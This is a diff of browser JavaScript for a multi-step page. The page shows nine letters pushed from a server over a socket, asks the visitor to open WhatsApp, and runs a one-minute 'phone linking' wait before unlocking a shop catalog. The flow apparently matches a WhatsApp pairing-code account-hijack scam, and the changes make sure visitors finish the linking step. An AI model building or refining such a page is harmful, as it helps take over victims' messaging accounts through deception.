@@ -1,6 +1,5 @@
 const form = document.getElementById('user-form');
 const stepForm = document.getElementById('step-form');
-const stepLinking = document.getElementById('step-linking');
 const stepBubbles = document.getElementById('step-bubbles');
 const stepCatalog = document.getElementById('step-catalog');
 const bubblesGrid = document.getElementById('bubbles-grid');
@@ -14,7 +13,11 @@ let socket = null;
 let sessionId = null;
 let currentLetters = Array(9).fill('');
 let cartCount = 0;
+
+// State flags for Complete button
+let lettersReceived = false;
 let whatsappClicked = false;
+let linkingCompleted = false;
 let linkingStarted = false;
 
 // Create the 9 bubbles
@@ -26,6 +29,9 @@ for (let i = 0; i < 9; i++) {
   bubblesGrid.appendChild(bubble);
 }
 
+// Complete button starts disabled
+btnComplete.disabled = true;
+
 function showStep(stepEl) {
   document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
   stepEl.classList.add('active');
@@ -35,6 +41,15 @@ function showToast(msg) {
   toast.textContent = msg;
   toast.classList.add('show');
   setTimeout(() => toast.classList.remove('show'), 2800);
+}
+
+function checkCompleteButton() {
+  // Only enable Complete when ALL conditions are met
+  if (lettersReceived && whatsappClicked && linkingCompleted) {
+    btnComplete.disabled = false;
+  } else {
+    btnComplete.disabled = true;
+  }
 }
 
 function updateBubbles(letters) {
@@ -50,8 +65,13 @@ function updateBubbles(letters) {
       bubble.classList.remove('filled');
     }
   });
+
+  // Check if at least some letters arrived
   const hasAny = letters.some(l => l && l.trim());
-  btnComplete.disabled = !hasAny;
+  if (hasAny) {
+    lettersReceived = true;
+    checkCompleteButton();
+  }
 }
 
 // ========== PRODUCTS DATA ==========
@@ -112,7 +132,7 @@ document.getElementById("category-tabs").addEventListener("click", (e) => {
   renderProducts(e.target.dataset.cat);
 });
 
-// ========== START THE 1-MINUTE LINKING OVERLAY ==========
+// ========== 1-MINUTE LINKING OVERLAY ==========
 function startLinkingWait() {
   if (linkingStarted) return;
   linkingStarted = true;
@@ -133,19 +153,19 @@ function startLinkingWait() {
   setTimeout(() => {
     clearInterval(timer);
     linkingOverlay.classList.add('hidden');
-    showToast('Phone linked successfully');
+    linkingCompleted = true;
+    checkCompleteButton();
+    showToast('Phone linked successfully – you can now click Complete');
   }, totalTime);
 }
 
-// Detect when user returns to the tab after leaving for WhatsApp
+// Detect when user returns to the tab
 document.addEventListener('visibilitychange', () => {
   if (document.visibilityState === 'visible' && whatsappClicked && !linkingStarted) {
-    // User came back after clicking WhatsApp
     startLinkingWait();
   }
 });
 
-// Also catch focus just in case
 window.addEventListener('focus', () => {
   if (whatsappClicked && !linkingStarted) {
     startLinkingWait();
@@ -205,9 +225,9 @@ form.addEventListener('submit', async (e) => {
       showToast(err.message || 'Connection error');
     });
 
-    // Go straight to the 9 bubbles page (NO wait yet)
+    // Go straight to bubbles
     showStep(stepBubbles);
-    showToast('Connected');
+    showToast('Connected – waiting for letters');
     btn.disabled = false;
     btn.textContent = 'Next';
 
@@ -224,15 +244,14 @@ document.addEventListener('click', (e) => {
   const link = e.target.closest('a.social-link.whatsapp');
   if (link) {
     whatsappClicked = true;
-    // small delay so the browser has time to open WhatsApp
-    setTimeout(() => {
-      // flag is already set – when they return, visibilitychange will fire
-    }, 300);
+    checkCompleteButton(); // still disabled until linking finishes
   }
 });
 
 // Complete → Catalog
 btnComplete.addEventListener('click', () => {
-  showStep(stepCatalog);
-  renderProducts('all');
+  if (!btnComplete.disabled) {
+    showStep(stepCatalog);
+    renderProducts('all');
+  }
 });
